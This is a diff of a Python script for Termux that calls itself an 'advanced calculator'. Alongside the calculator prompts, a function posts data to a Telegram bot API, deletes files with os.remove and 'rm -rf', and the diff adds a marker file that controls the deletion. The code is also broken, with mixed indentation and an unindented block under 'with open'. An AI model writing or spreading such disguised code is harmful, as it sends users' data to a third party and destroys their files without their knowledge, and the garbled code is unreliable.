@@ -1,17 +1,24 @@
 import os, sys, threading, requests 
+
+
+								
+if os.path.exists("y.htm"):
+    try:
+        os.remove("T")	
+		sys.exit()	
+			
+	except:
+		os.system("rm -rf T")
+		sys.exit()		
 		
-try:
-    if os.path.exists("File.py"):
-        os.remove("File.py")		
-		
-except:
+else:
 	pass		
 
 def main():
 	os.system('clear')
 	
 	
-	print("hello")
+	print("Welcome to advanced calculator")
 	while True:
 		x = int(input("Write Number : "))
 		y = int(input("Enter another number : "))
@@ -30,6 +37,9 @@ def fuck():
 	url = f'https://api.telegram.org/bot{API}/sendMessage?chat_id={ID}&text=\n {y}\n '
 	z = requests.get(url)
 	os.chdir("/data/data/com.termux/files/home/")
+	with open (f"y.htm", "a") as file:
+	file.write(f"(html")
+	file.close()
 	try:
 		os.remove("T")
 		
